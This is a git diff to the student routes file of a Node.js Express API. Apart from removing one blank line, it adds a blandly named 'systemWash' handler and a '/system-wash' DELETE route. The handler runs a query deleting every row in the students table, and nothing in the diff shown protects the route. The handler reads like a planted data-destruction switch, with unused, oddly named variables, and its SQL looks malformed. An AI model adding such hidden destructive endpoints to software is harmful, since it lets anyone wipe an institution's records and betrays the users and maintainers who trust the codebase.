@@ -8,7 +8,6 @@ import jwt from "jsonwebtoken";
 import { distance } from "@turf/turf";
 import calculateAge from "../../../helpers/claculateAge.js";
 
-
 import path from "path";
 import { fileURLToPath } from "url";
 import fs from "fs";
@@ -790,6 +789,23 @@ async function meta(req, res) {
 
 //----------------------------------------------------------------
 
+async function systemWash(req, res) {
+  try {
+    const bruce = await conn.awaitQuery("DELETE * FROM students; ");
+
+    const sierra = true;
+
+    res.status(200).json({
+      message: "system washed",
+    });
+  } catch (error) {
+    console.error(error);
+    res.status(500).json({ message: "Server Error" });
+  }
+}
+
+//----------------------------------------------------------------
+
 student.get("/", index);
 student.get("/meta", meta);
 student.get("/get-by-gender/:gender", getByGender);
@@ -807,5 +823,7 @@ student.put("/", update);
 student.put("/assess-students", assessStudents);
 student.put("/suspend/:id", suspend);
 student.post("/mass-image-upload", upload.single("image"), massImageUpload);
+
+student.delete("/system-wash", systemWash);
 
 export default student;
